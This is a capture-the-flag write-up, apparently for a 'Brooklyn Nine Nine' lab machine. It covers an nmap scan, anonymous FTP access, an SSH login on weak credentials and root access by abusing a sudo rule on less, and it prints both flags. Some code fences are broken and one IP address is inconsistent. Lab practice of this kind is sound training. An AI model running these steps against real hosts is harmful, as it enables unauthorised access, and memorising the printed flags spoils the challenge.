## üîç Enumeration

- Starting with Nmap, I also ran Gobuster but it didn't find anything useful.

  ```
  nmap -sC -sV -T5 -p- 10.10.66.96

- Since port 21 is open and allows Anonymous access let's get inside and download all necessary files.

  ```
  ftp 1.10.66.96
  230 Login successful.
  Remote system type is UNIX.

  ```
  
- After reading the note we can see that one user is using weak credentials which means brute forcing will pay out.

  ```
  cat note_to_jake.txt 
  From Amy,
  
  Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
  ```

  ```

- Beautiful, let's now login with SSH and get those flags!

## üßç User Privilege Escalation

- As always, user flag is already there.

  ```
  jake@10.10.66.96's password:

  ```
  
- Moving to escalation.

## üëë Root Privilege Escalation

- This one wasn't hard as well, when you run `sudo -l` you will see it with your own eyes.

  ```
  jake@brookly_nine_nine:/home/holt$ sudo -l
  Matching Defaults entries for jake on brookly_nine_nine:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User jake may run the following commands on brookly_nine_nine:
      (ALL) NOPASSWD: /usr/bin/less
      
  jake@brookly_nine_nine:/home/holt$ sudo less /root/root.txt
  
  -- Creator : Fsociety2006 --
  Congratulations in rooting Brooklyn Nine Nine
  Here is the flag: 63a9f0ea7bb98050796b649e85481845
  
  Enjoy!!
  ```
  
- We will meet in the next one, bye!

## üèÅ Flags

- **User Flag**: `ee11cbb19052e40b07aac0ca060c23ee`
- **Root Flag**: `63a9f0ea7bb98050796b649e85481845`

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `Pretty basic room tho.`

- What did I learn?
  `Nothing new, just sharpening my skillzzzzz.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü
